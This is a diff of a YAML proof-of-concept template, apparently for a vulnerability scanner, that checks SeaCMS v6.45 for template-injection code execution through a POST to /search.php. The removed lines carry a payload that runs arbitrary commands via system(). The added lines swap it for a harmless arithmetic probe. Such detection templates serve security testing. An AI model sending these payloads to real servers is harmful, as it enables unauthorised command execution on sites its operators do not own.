@@ -1,12 +1,13 @@
 name: poc-yaml-seacmsv645-command-exec
 set:
-  rand: randomInt(200000000, 210000000)
+  rand1: randomInt(200000000, 210000000)
+  rand2: randomInt(200000000, 210000000)
 rules:
   - method: POST
     path: /search.php?searchtype=5
-    body: searchtype=5&order=}{end if}{if:1)$_POST[func]($_POST[cmd]);if(1}{end if}&func=system&cmd=echo ({{rand}})
+    body: searchtype=5&order=}{end if} {if:1)print({{rand1}}%2b{{rand2}});if(1}{end if}
     expression: |
-      response.body.bcontains(bytes(string(rand)))
+      response.body.bcontains(bytes(string(rand1 + rand2)))
 detail:
   author: Facker007(https://github.com/Facker007)
   links:
